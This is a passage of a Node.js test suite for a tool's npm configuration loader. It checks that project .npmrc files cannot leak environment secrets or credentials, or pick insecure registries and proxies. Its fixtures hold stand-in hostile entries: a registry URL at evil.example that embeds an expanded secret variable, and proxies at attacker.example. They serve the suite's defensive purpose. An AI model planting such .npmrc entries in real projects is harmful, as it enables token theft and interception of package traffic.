import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { access, mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test, { afterEach } from "node:test";
import { inspect, promisify } from "node:util";

import { loadNpmRegistryOptions, pacoteTarballUrl, requestOptions } from "../src/npm-config.js";
import { removeTemporaryDirectories, temporaryDirectory } from "./temporary-directory.mjs";

afterEach(removeTemporaryDirectories);

const SCOPE = "@schalkneethling";
const SECRET = "SECRETVALUE0123456789";

/**
 * A project directory and a user .npmrc in a temporary directory, with an environment that cannot
 * reach the developer's own ~/.npmrc.
 * @param {{ project?: string, user?: string, env?: Record<string, string> }} files
 */
async function fixture({ project, user, env = {} }) {
  const directory = await temporaryDirectory("calavera-npm-config-");
  const cwd = join(directory, "project");
  await mkdir(cwd);
  if (project !== undefined) await writeFile(join(cwd, ".npmrc"), project);
  const userconfig = join(directory, "user.npmrc");
  if (user !== undefined) await writeFile(userconfig, user);
  // An empty account home, so no test reads the developer's ~/.npmrc.
  const accountHome = join(directory, "account-home");
  return {
    directory,
    cwd,
    accountHome,
    env: { npm_config_userconfig: userconfig, ...env },
    scope: SCOPE,
  };
}

test("a project .npmrc value with a variable reference is ignored with a warning that names the key", async () => {
  const context = await fixture({
    project: `//registry.example.com/:_authToken=\${NPM_TOKEN}\n`,
    env: { NPM_TOKEN: SECRET },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /\/\/registry\.example\.com\/:_authToken/);
  assert.match(warnings[0], /project \.npmrc/);
  assert.doesNotMatch(inspect([warnings, diagnostics]), new RegExp(SECRET));
});

test("a project .npmrc key with a variable reference is ignored", async () => {
  const context = await fixture({
    project: `//\${HOST}/:_authToken=literal\n`,
    env: { HOST: "registry.example.com" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.match(warnings[0], /\/\/\$\{HOST\}\/:_authToken/);
});

test("a project .npmrc drop does not remove a valid user .npmrc value", async () => {
  const context = await fixture({
    project: `//registry.example.com/:_authToken=\${NPM_TOKEN}\n`,
    user: "//registry.example.com/:_authToken=from-user\n",
    env: { NPM_TOKEN: SECRET },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options["//registry.example.com/:_authToken"], "from-user");
});

test("the user .npmrc and the environment expand variables in keys and values", async () => {
  const context = await fixture({
    user: `//\${CI_SERVER_HOST}/api/v4/projects/\${CI_PROJECT_ID}/packages/npm/:_authToken=\${CI_JOB_TOKEN}\n`,
    env: { CI_SERVER_HOST: "gitlab.example.com", CI_PROJECT_ID: "42", CI_JOB_TOKEN: SECRET },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {
    "//gitlab.example.com/api/v4/projects/42/packages/npm/:_authToken": SECRET,
  });
});

test("an unset variable drops the key, and the diagnostics name the key and variable", async () => {
  const context = await fixture({
    user: `//registry.example.com/:_authToken=\${CALAVERA_UNSET_TOKEN}\n//\${CALAVERA_UNSET_HOST}/:_authToken=${SECRET}\n`,
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {});
  assert.deepEqual(warnings, []);
  const text = diagnostics.join("\n");
  assert.match(text, /CALAVERA_UNSET_TOKEN/);
  assert.match(text, /CALAVERA_UNSET_HOST/);
  assert.match(text, /\/\/registry\.example\.com\/:_authToken/);
  assert.doesNotMatch(text, new RegExp(SECRET));
});

test("a registry URL with credentials is rejected, naming the auth keys and not the value", async () => {
  const context = await fixture({
    project: `${SCOPE}:registry=https://alice:${SECRET}@registry.example.com/\n`,
  });
  await assert.rejects(
    () => loadNpmRegistryOptions(context),
    (error) => {
      assert.match(error.message, /@schalkneethling:registry/);
      assert.match(error.message, /_authToken/);
      assert.match(error.message, /_password/);
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET}|alice`));
      return true;
    },
  );
  const plain = await fixture({ user: `registry=https://${SECRET}@registry.example.com/\n` });
  await assert.rejects(() => loadNpmRegistryOptions(plain), /registry.*_authToken/s);
});

test("only the registry and the artifact scope registry are validated", async () => {
  const context = await fixture({
    project: `@other:registry=not a url\n@blank:registry=\n${SCOPE}:registry=https://registry.example.com/\n`,
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { [`${SCOPE}:registry`]: "https://registry.example.com/" });

  const invalid = await fixture({ project: `${SCOPE}:registry=not a url\n` });
  await assert.rejects(() => loadNpmRegistryOptions(invalid), /@schalkneethling:registry/);
});

test("a blank registry for the artifact scope is skipped with a warning", async () => {
  const context = await fixture({
    user: "registry=https://registry.example.com/\n",
    project: `${SCOPE}:registry=\n`,
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.match(warnings.join("\n"), /@schalkneethling:registry/);
});

test("an unreadable .npmrc is skipped with a warning that names the path and code", async () => {
  const context = await fixture({ user: "registry=https://registry.example.com/\n" });
  // A directory named .npmrc cannot be read as a file (EISDIR).
  await mkdir(join(context.cwd, ".npmrc"));
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /EISDIR/);
  assert.match(
    warnings[0],
    new RegExp(join(context.cwd, ".npmrc").replace(/[\\^$.*+?()[\]{}|]/g, "\\$&")),
  );
  assert.deepEqual(diagnostics, warnings);
});

test("a missing .npmrc is not a warning", async () => {
  const { warnings } = await loadNpmRegistryOptions(await fixture({}));
  assert.deepEqual(warnings, []);
});

test("npm_config_userconfig expands ~ and variables, and a project userconfig is ignored", async () => {
  const context = await fixture({ project: "userconfig=/nonexistent/other.npmrc\n" });
  const home = join(context.directory, "home");
  await mkdir(home);
  await writeFile(join(home, "tokens.npmrc"), "registry=https://home.example.com/\n");
  const viaTilde = await loadNpmRegistryOptions({
    ...context,
    env: { HOME: home, npm_config_userconfig: "~/tokens.npmrc" },
  });
  assert.equal(viaTilde.options.registry, "https://home.example.com/");

  const viaVariable = await loadNpmRegistryOptions({
    ...context,
    env: { CONFIG_DIR: home, npm_config_userconfig: "${CONFIG_DIR}/tokens.npmrc" },
  });
  assert.equal(viaVariable.options.registry, "https://home.example.com/");

  const defaultPath = await loadNpmRegistryOptions({ ...context, env: { HOME: home } });
  assert.equal(defaultPath.options.registry, undefined);
  await writeFile(join(home, ".npmrc"), "registry=https://default.example.com/\n");
  const viaHome = await loadNpmRegistryOptions({ ...context, env: { HOME: home } });
  assert.equal(viaHome.options.registry, "https://default.example.com/");
});

test("auth settings pass through in the form npm-registry-fetch reads", async () => {
  const context = await fixture({
    user: [
      "//a.example.com/:_auth=YWxpY2U6cHc=",
      "//b.example.com/:username=alice",
      "//b.example.com/:_password=cHc=",
      "//c.example.com/:certfile=/etc/cert.pem",
      "//c.example.com/:keyfile=/etc/key.pem",
      "//d.example.com/:email=ignored@example.com",
      "_authToken=not-nerf-darted",
    ].join("\n"),
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {
    "//a.example.com/:_auth": "YWxpY2U6cHc=",
    "//b.example.com/:username": "alice",
    "//b.example.com/:_password": "cHc=",
    "//c.example.com/:certfile": "/etc/cert.pem",
    "//c.example.com/:keyfile": "/etc/key.pem",
  });
});

test("the effective registry and where it came from are reported", async () => {
  const none = await loadNpmRegistryOptions(await fixture({}));
  assert.deepEqual(none.registry, { origin: "https://registry.npmjs.org", source: "default" });

  const user = await loadNpmRegistryOptions(
    await fixture({ user: "registry=https://user.example.com:8443/\n" }),
  );
  assert.deepEqual(user.registry, {
    origin: "https://user.example.com:8443",
    source: "user .npmrc",
  });

  const project = await loadNpmRegistryOptions(
    await fixture({
      user: "registry=https://user.example.com/\n",
      project: `${SCOPE}:registry=https://project.example.com/\n`,
    }),
  );
  assert.deepEqual(project.registry, {
    origin: "https://project.example.com",
    source: "project .npmrc",
  });

  const env = await loadNpmRegistryOptions(
    await fixture({
      project: "registry=https://project.example.com/\n",
      env: { NPM_CONFIG_REGISTRY: "https://env.example.com/" },
    }),
  );
  assert.deepEqual(env.registry, { origin: "https://env.example.com", source: "environment" });
});

// What `npm exec` and `npm run` export to a child, captured with npm 11.19.0 for a project
// .npmrc of `registry=https://evil.example/${SECRET_X}/`: npm expands the variable itself and
// exports the result as npm_config_registry, next to markers that show npm started the process.
const SECRET_X = "s3cr3t-from-the-environment";
/** @param {string} cwd @param {string} userconfig */
function npmExecEnvironment(cwd, userconfig) {
  return {
    SECRET_X,
    npm_command: "exec",
    npm_lifecycle_event: "npx",
    npm_execpath: "/usr/lib/node_modules/npm/bin/npm-cli.js",
    npm_config_local_prefix: cwd,
    npm_config_userconfig: userconfig,
    npm_config_registry: `https://evil.example/${SECRET_X}/`,
  };
}

test("a registry that npm expanded from the project .npmrc is not trusted as the environment", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const env = npmExecEnvironment(context.cwd, context.env.npm_config_userconfig);
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(result.options.registry, undefined);
  assert.deepEqual(result.registry, { origin: "https://registry.npmjs.org", source: "default" });
  assert.equal(result.warnings.length, 1);
  assert.match(result.warnings[0], /registry/);
  assert.match(result.warnings[0], /project \.npmrc/);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_X));
});

test("npm run exports the same shape, so it is handled the same way", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_command: "run",
    npm_lifecycle_event: "show",
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(result.options.registry, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_X));
});

test("a registry that npm exported from a literal project .npmrc value is labeled as the project", async () => {
  const context = await fixture({ project: "registry=https://project.example.com/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: "https://project.example.com/",
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.deepEqual(result.registry, {
    origin: "https://project.example.com",
    source: "project .npmrc",
  });
});

test("a registry that npm exported from the user .npmrc is labeled as the user file", async () => {
  const context = await fixture({ user: "registry=https://user.example.com/${SECRET_X}/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: `https://user.example.com/${SECRET_X}/`,
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(result.registry.source, "user .npmrc");
});

test("an explicit npm_config_registry still wins under npm when it differs from the project file", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const env = {
    ...npmExecEnvironment(context.cwd, context.env.npm_config_userconfig),
    npm_config_registry: "https://chosen.example.com/",
  };
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.deepEqual(result.registry, {
    origin: "https://chosen.example.com",
    source: "environment",
  });
});

test("the project file is not consulted for the environment when npm did not start Calavera", async () => {
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  const { npm_command, npm_lifecycle_event, npm_execpath, npm_config_local_prefix, ...env } =
    npmExecEnvironment(context.cwd, context.env.npm_config_userconfig);
  void [npm_command, npm_lifecycle_event, npm_execpath, npm_config_local_prefix];
  const result = await loadNpmRegistryOptions({ ...context, env });
  assert.equal(result.registry.source, "environment");
});

test("the environment npm creates for a real npm exec does not reach a request", async (t) => {
  const execFileAsync = promisify(execFile);
  const context = await fixture({ project: "registry=https://evil.example/${SECRET_X}/\n" });
  // Start from an environment without npm_config_* so the developer's own settings do not leak in.
  const clean = Object.fromEntries(
    Object.entries(process.env).filter(([name]) => !/^npm_/i.test(name)),
  );
  let output;
  try {
    ({ stdout: output } = await execFileAsync(
      "npm",
      ["exec", "--", "node", "-p", "JSON.stringify(process.env)"],
      {
        cwd: context.cwd,
        env: { ...clean, SECRET_X, npm_config_userconfig: context.env.npm_config_userconfig },
      },
    ));
  } catch (error) {
    t.skip(`npm exec is not available: ${error.code ?? error.message}`);
    return;
  }
  const captured = JSON.parse(output);
  assert.equal(captured.npm_config_registry, `https://evil.example/${SECRET_X}/`);
  const result = await loadNpmRegistryOptions({ ...context, env: captured });
  assert.equal(result.options.registry, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_X));
});

test("a project .npmrc cannot choose an http registry", async () => {
  const context = await fixture({ project: `${SCOPE}:registry=http://registry.example.com/\n` });
  await assert.rejects(
    () => loadNpmRegistryOptions(context),
    (error) => {
      assert.match(error.message, /@schalkneethling:registry/);
      assert.match(error.message, /project \.npmrc/);
      assert.match(error.message, /https/);
      return true;
    },
  );
});

test("an http registry from the user .npmrc or the environment is allowed", async () => {
  const user = await loadNpmRegistryOptions(
    await fixture({ user: "registry=http://registry.example.com/\n" }),
  );
  assert.deepEqual(user.registry, { origin: "http://registry.example.com", source: "user .npmrc" });
  const env = await loadNpmRegistryOptions(
    await fixture({ env: { npm_config_registry: "http://registry.example.com/" } }),
  );
  assert.deepEqual(env.registry, { origin: "http://registry.example.com", source: "environment" });
});

test("an http registry with credentials for its host warns that Calavera sends none to it", async () => {
  const withToken = await loadNpmRegistryOptions(
    await fixture({
      user: "registry=http://registry.example.com/\n//registry.example.com/:_authToken=abc\n",
    }),
  );
  assert.equal(withToken.warnings.length, 1);
  assert.match(withToken.warnings[0], /http:\/\/registry\.example\.com/);
  assert.match(withToken.warnings[0], /uses http, so Calavera sends no credentials to it/);
  assert.doesNotMatch(withToken.warnings[0], /abc/);

  const withoutToken = await loadNpmRegistryOptions(
    await fixture({ user: "registry=http://registry.example.com/\n" }),
  );
  assert.deepEqual(withoutToken.warnings, []);

  const https = await loadNpmRegistryOptions(
    await fixture({
      user: "registry=https://registry.example.com/\n//registry.example.com/:_authToken=abc\n",
    }),
  );
  assert.deepEqual(https.warnings, []);
});

test("a control character in a project key cannot reach a warning", async () => {
  const key = "//evil.example/\u001b[31mred\u001b]0\u0007:_authToken";
  const context = await fixture({ project: `${key}=\${SECRET_X}\n` });
  const { warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(warnings.length, 1);
  for (const text of [...warnings, ...diagnostics]) {
    assert.doesNotMatch(text, /\p{Cc}/u);
    assert.match(text, /evil\.example/);
  }

  const long = await fixture({
    project: `//${"a".repeat(500)}.example/:_authToken=\${SECRET_X}\n`,
  });
  assert.ok((await loadNpmRegistryOptions(long)).warnings[0].length < 400);
});

test("certfile and keyfile are read from the user .npmrc only", async () => {
  const context = await fixture({
    project: "//a.example.com/:certfile=/etc/cert.pem\n//a.example.com/:keyfile=/etc/key.pem\n",
    user: "//b.example.com/:certfile=/etc/cert.pem\n//b.example.com/:keyfile=/etc/key.pem\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.deepEqual(Object.keys(options).sort(), [
    "//b.example.com/:certfile",
    "//b.example.com/:keyfile",
  ]);
  assert.equal(warnings.length, 2);
  assert.match(warnings[0], /\/\/a\.example\.com\/:certfile/);
  assert.match(warnings[1], /\/\/a\.example\.com\/:keyfile/);
  assert.doesNotMatch(warnings.join("\n"), /\/etc\//);
});

test("a registry URL with credentials in the environment is rejected", async () => {
  const context = await fixture({
    env: { npm_config_registry: `https://alice:${SECRET}@registry.example.com/` },
  });
  await assert.rejects(
    () => loadNpmRegistryOptions(context),
    (error) => {
      assert.match(error.message, /_authToken/);
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET}|alice`));
      return true;
    },
  );
});

const PROXY_SECRET = "PROXYPASS0123456789";

test("proxy, https-proxy, and noproxy from the user .npmrc reach the options npm-registry-fetch reads", async () => {
  const context = await fixture({
    user: `proxy=http://proxy.example.com:8080/\nhttps-proxy=http://user:${PROXY_SECRET}@secure-proxy.example.com:8443/\nnoproxy=internal.example.com,.corp.example.com\n`,
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://proxy.example.com:8080/");
  assert.equal(options.httpsProxy, `http://user:${PROXY_SECRET}@secure-proxy.example.com:8443/`);
  assert.equal(options.noProxy, "internal.example.com,.corp.example.com");
  // npm-registry-fetch reads camelCase names only, so the .npmrc spellings must not leak through.
  assert.equal(options["https-proxy"], undefined);
  assert.equal(options.noproxy, undefined);
  assert.deepEqual(warnings, []);
  assert.doesNotMatch(inspect(diagnostics), new RegExp(PROXY_SECRET));
});

test("a proxy in the project .npmrc is ignored with a warning, and its noproxy still applies", async () => {
  const context = await fixture({
    project:
      "https-proxy=http://proxy.example.com:8080/\nproxy=http://proxy.example.com:8080/\nnoproxy=registry.internal.example.com\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.proxy, undefined);
  assert.equal(options.noProxy, "registry.internal.example.com");
  assert.equal(warnings.length, 2);
  // Warnings follow the order of the file.
  assert.match(
    warnings[0],
    /^Ignored https-proxy in the project \.npmrc: Calavera reads proxies only from user.*To use it, set it in your user \.npmrc\.$/,
  );
  assert.match(warnings[1], /^Ignored proxy in the project \.npmrc/);
});

test("a noproxy list in the .npmrc is joined with commas, as npm joins it", async () => {
  const context = await fixture({ user: "noproxy[]=a.example.com\nnoproxy[]=b.example.com\n" });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.noProxy,
    "a.example.com,b.example.com",
  );
});

test("npm_config_https_proxy and npm_config_noproxy override the .npmrc files", async () => {
  const context = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\nnoproxy=a.example.com\n",
    env: {
      npm_config_https_proxy: "http://env-proxy.example.com/",
      npm_config_noproxy: "b.example.com",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://env-proxy.example.com/");
  assert.equal(options.noProxy, "b.example.com");
});

test("a proxy URL that is not http, https, or socks is ignored with a warning that does not echo it", async () => {
  const context = await fixture({
    user: `proxy=ftp://user:${PROXY_SECRET}@proxy.example.com/\nhttps-proxy=not a url ${PROXY_SECRET}\n`,
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(warnings.length, 2);
  assert.match(warnings[0], /\bproxy\b.*user \.npmrc/);
  assert.match(warnings[1], /https-proxy.*user \.npmrc/);
  assert.doesNotMatch(inspect([warnings, diagnostics]), new RegExp(PROXY_SECRET));
});

test("a socks proxy is accepted, because @npmcli/agent supports it", async () => {
  const context = await fixture({ user: "https-proxy=socks5://proxy.example.com:1080\n" });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "socks5://proxy.example.com:1080");
});

test("a project .npmrc proxy with a variable reference is ignored like other project entries", async () => {
  const context = await fixture({
    project: "https-proxy=http://${PROXY_USER}@proxy.example.com/\n",
    env: { PROXY_USER: PROXY_SECRET },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /https-proxy.*project \.npmrc/);
  assert.doesNotMatch(inspect(warnings), new RegExp(PROXY_SECRET));
});

test("a project .npmrc proxy is ignored for an http registry, so it cannot read credentials in plain text", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\n//registry.example.com/:_authToken=user-token\n",
    project: "proxy=http://proxy.example.com/\nhttps-proxy=http://proxy.example.com/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.equal(options.httpsProxy, undefined);
  assert.ok(warnings.some((warning) => warning.startsWith("Ignored proxy in the project .npmrc")));
});

test("a user .npmrc proxy is still used for an http registry", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\nproxy=http://proxy.example.com/\n",
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://proxy.example.com/");
});

test("a long project key is shortened in a warning", async () => {
  const key = `//${"a".repeat(200)}.example.com/:_authToken`;
  const context = await fixture({ project: `${key}=\${NPM_TOKEN}\n` });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.match(warnings[0], new RegExp(`Ignored //${"a".repeat(118)}\\.\\.\\. in the project`));
});

test("an empty proxy in a later file unsets the proxy, as an empty npm setting does", async () => {
  const context = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\nproxy=http://user-proxy.example.com/\n",
    project: "https-proxy=\nproxy=\n",
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.proxy, undefined);
  assert.deepEqual(Object.keys(options), []);
});

test("a project noproxy still applies for an http registry, because it only removes the proxy", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\nproxy=http://proxy.example.com/\n",
    project: "noproxy=registry.example.com\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.noProxy, "registry.example.com");
  assert.deepEqual(warnings, []);
});

test("a project .npmrc proxy does not remove the user .npmrc proxy, and the warning says which one applies", async () => {
  const context = await fixture({
    user: "https-proxy=http://corp.example.com:8080/\nproxy=http://corp.example.com:8080/\n",
    project: "https-proxy=http://team.example.com:3128/\nproxy=http://team.example.com:3128/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://corp.example.com:8080/");
  assert.equal(options.proxy, "http://corp.example.com:8080/");
  assert.equal(warnings.length, 2);
  for (const warning of warnings) {
    assert.match(
      warning,
      /in the project \.npmrc: .*Calavera uses https-proxy from the user \.npmrc instead\.$/,
    );
    assert.doesNotMatch(warning, /No other proxy setting applies/);
  }
});

test("the project proxy warning names the proxy that is used after every layer is read", async () => {
  const overridden = await fixture({
    user: "https-proxy=http://user-proxy.example.com/\n",
    project: "https-proxy=http://team-proxy.example.com/\n",
    env: { npm_config_https_proxy: "http://env-proxy.example.com/" },
  });
  const overriddenResult = await loadNpmRegistryOptions(overridden);
  assert.equal(overriddenResult.options.httpsProxy, "http://env-proxy.example.com/");
  assert.match(
    overriddenResult.warnings[0],
    /Calavera uses https-proxy from the environment instead\.$/,
  );

  const emptyUser = await fixture({
    user: "https-proxy=\n",
    project: "https-proxy=http://team-proxy.example.com/\n",
  });
  const emptyResult = await loadNpmRegistryOptions(emptyUser);
  assert.equal(emptyResult.options.httpsProxy, undefined);
  assert.match(emptyResult.warnings[0], /To use it, set it in your user \.npmrc\.$/);
});

/**
 * A repository whose root .npmrc holds `npmrc`, run as `npm exec` from `member` (a path below the
 * root). npm reads the project .npmrc at its local prefix, the root here, and exports its values.
 * @param {{ npmrc: string, member: string, rootPackage: object, memberPackage?: object, exported: Record<string, string> }} setup
 */
async function npmExecFromBelowRoot({ npmrc, member, rootPackage, memberPackage, exported }) {
  const directory = await temporaryDirectory("calavera-npm-prefix-");
  const root = join(directory, "repo");
  const cwd = join(root, member);
  await mkdir(cwd, { recursive: true });
  await writeFile(join(root, ".npmrc"), npmrc);
  await writeFile(join(root, "package.json"), JSON.stringify(rootPackage));
  if (memberPackage) await writeFile(join(cwd, "package.json"), JSON.stringify(memberPackage));
  return {
    cwd,
    scope: SCOPE,
    accountHome: join(directory, "account-home"),
    env: {
      npm_config_userconfig: join(directory, "missing.npmrc"),
      npm_command: "exec",
      npm_config_local_prefix: root,
      ...exported,
    },
  };
}

test("under npm exec from a workspace member, the workspace root .npmrc proxy is a project proxy", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "https-proxy=http://attacker.example:8080/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_https_proxy: "http://attacker.example:8080/" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /^Ignored https-proxy in the project \.npmrc/);
});

test("under npm exec from a subdirectory without package.json, the package root .npmrc is the project file", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc:
      "https-proxy=http://attacker.example:8080/\nregistry=https://project-registry.example.com/\n",
    member: "src/lib",
    rootPackage: { name: "repo" },
    exported: {
      npm_config_https_proxy: "http://attacker.example:8080/",
      npm_config_registry: "https://project-registry.example.com/",
    },
  });
  const { options, registry, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings[0], /^Ignored https-proxy in the project \.npmrc/);
  // The registry keeps its project label, as when npm runs from the root itself.
  assert.deepEqual(registry, {
    origin: "https://project-registry.example.com",
    source: "project .npmrc",
  });
});

test("under npm exec from a workspace member, the root .npmrc cannot choose an http registry", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=http://registry.example.com/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_registry: "http://registry.example.com/" },
  });
  await assert.rejects(loadNpmRegistryOptions(context), /project \.npmrc must be an https URL/);
});

test("npm_config_noproxy in npm's exported list format is joined with commas", async () => {
  const exported = await fixture({
    user: "noproxy[]=a.example.com\nnoproxy[]=b.example.com\n",
    env: {
      npm_command: "exec",
      npm_config_noproxy: "a.example.com\n\nb.example.com",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(exported)).options.noProxy,
    "a.example.com,b.example.com",
  );
  const plain = await fixture({ env: { npm_config_noproxy: "a.example.com\n\nb.example.com" } });
  assert.equal(
    (await loadNpmRegistryOptions(plain)).options.noProxy,
    "a.example.com,b.example.com",
  );
});

test("a rejected project proxy warning names the user https-proxy that npm-registry-fetch uses", async () => {
  const context = await fixture({
    user: "https-proxy=http://corp.example.com:8080/\n",
    project: "proxy=http://team.example.com:3128/\n",
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.httpsProxy, "http://corp.example.com:8080/");
  assert.match(
    warnings[0],
    /^Ignored proxy in the project \.npmrc: .*Calavera uses https-proxy from the user \.npmrc instead\.$/,
  );
});

test("under npm exec, a workspace member's own .npmrc is not read, as npm ignores it", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=https://root-registry.example.com/\n",
    member: "packages/web",
    rootPackage: { name: "repo", workspaces: ["packages/*"] },
    memberPackage: { name: "web" },
    exported: { npm_config_registry: "https://root-registry.example.com/" },
  });
  await writeFile(join(context.cwd, ".npmrc"), "registry=https://member-registry.example.com/\n");
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://root-registry.example.com",
    source: "project .npmrc",
  });
});

test("under npm exec, a local prefix at the user .npmrc folder is not read twice as a project file", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "registry=http://user-registry.example.com/\n",
    member: "src",
    rootPackage: { name: "repo" },
    exported: { npm_config_registry: "http://user-registry.example.com/" },
  });
  // The repository root's .npmrc is the user's own file here, so its http registry is allowed.
  context.env.npm_config_userconfig = join(context.env.npm_config_local_prefix, ".npmrc");
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "http://user-registry.example.com",
    source: "user .npmrc",
  });
});

test("under npm exec, a project proxy written with another spelling is recognized as project content", async () => {
  for (const spelling of ["https_proxy", "HTTPS-PROXY"]) {
    const context = await fixture({
      project: `${spelling}=http://attacker.example:8080/\n`,
      env: { npm_command: "exec", npm_config_https_proxy: "http://attacker.example:8080/" },
    });
    const { options, warnings } = await loadNpmRegistryOptions(context);
    assert.equal(options.httpsProxy, undefined, spelling);
    assert.match(warnings[0], new RegExp(`^Ignored ${spelling} in the project \\.npmrc`), spelling);
  }
});

test("the ignored project proxy warning names HTTPS_PROXY when that variable carries the requests", async () => {
  const context = await fixture({
    project: "https-proxy=http://team.example.com:3128/\n",
    env: { npm_command: "exec", HTTPS_PROXY: "http://corp.example.com:8080/" },
  });
  context.env.npm_config_local_prefix = context.cwd;
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.match(warnings[0], /Calavera uses the HTTPS_PROXY environment variable instead\.$/);
});

test("npm_config_local_prefix alone marks a start by npm", async () => {
  const context = await npmExecFromBelowRoot({
    npmrc: "https-proxy=http://attacker.example:8080/\n",
    member: "src",
    rootPackage: { name: "repo" },
    exported: { npm_config_https_proxy: "http://attacker.example:8080/" },
  });
  delete context.env.npm_command;
  assert.equal((await loadNpmRegistryOptions(context)).options.httpsProxy, undefined);
});

/** The project folder of the fixture the previous test created. */
let previousFixtureFolder = "";

test("a fixture folder exists during its test", async () => {
  const context = await fixture({ project: "registry=https://registry.example.com/\n" });
  previousFixtureFolder = context.cwd;
  await access(previousFixtureFolder);
});

test("the previous test's fixture folder is removed after that test", async () => {
  assert.notEqual(previousFixtureFolder, "");
  await assert.rejects(access(previousFixtureFolder), { code: "ENOENT" });
});

test("the ignored project proxy warning says requests go direct when noproxy or NO_PROXY excludes the registry", async () => {
  /** @type {Record<string, string>[]} */
  const exclusions = [{ NO_PROXY: "registry.npmjs.org" }, { npm_config_noproxy: "npmjs.org" }];
  for (const exclusion of exclusions) {
    const context = await fixture({
      user: "https-proxy=http://corp.example.com:8080/\n",
      project: "https-proxy=http://team.example.com:3128/\n",
      env: { HTTPS_PROXY: "http://env-proxy.example.com/", ...exclusion },
    });
    const { warnings } = await loadNpmRegistryOptions(context);
    assert.match(
      warnings[0],
      /The registry host is excluded from proxies, so requests go to it directly\.$/,
      JSON.stringify(exclusion),
    );
  }
});

test("for an http registry, the ignored project proxy warning names HTTP_PROXY", async () => {
  const context = await fixture({
    user: "registry=http://registry.example.com/\n",
    project: "proxy=http://team.example.com:3128/\n",
    env: { HTTP_PROXY: "http://corp.example.com:8080/" },
  });
